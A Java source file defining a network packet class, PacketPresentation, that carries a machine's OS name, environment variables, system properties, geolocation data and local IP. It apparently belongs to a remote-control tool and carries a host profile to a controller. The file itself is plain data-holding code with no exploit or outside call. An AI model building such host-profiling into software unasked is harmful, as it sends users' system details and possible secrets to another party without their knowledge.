package com.melardev.xeytanj.net.packets;

import java.net.Inet4Address;
import java.net.UnknownHostException;
import java.util.HashMap;

public class PacketPresentation extends Packet {

    private String os;
    private HashMap<String, String> env;
    private HashMap<String, String> properties;
    private String geoData;
    private String localIp;

    public PacketPresentation() {
        super(PacketType.PRESENTATION);
    }

    public PacketPresentation(String geoData, HashMap<String, String> properties, HashMap<String, String> env, String os) {
        super(PacketType.PRESENTATION);
        this.geoData = geoData;
        this.os = os;
        this.properties = properties;
        this.env = env;
        try {
            localIp = Inet4Address.getLocalHost().getHostAddress();
        } catch (UnknownHostException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    public String getOs() {
        return os;
    }

    public void setOs(String os) {
        this.os = os;
    }

    public HashMap<String, String> getEnv() {
        return env;
    }

    public void setEnv(HashMap<String, String> env) {
        this.env = env;
    }

    public HashMap<String, String> getProperties() {
        return properties;
    }

    public void setProperties(HashMap<String, String> properties) {
        this.properties = properties;
    }

    public String getGeoData() {
        return geoData;
    }

    public void setGeoData(String geoData) {
        this.geoData = geoData;
    }

    public String getLocalIp() {
        return localIp;
    }

    public void setLocalIp(String localIp) {
        this.localIp = localIp;
    }
}
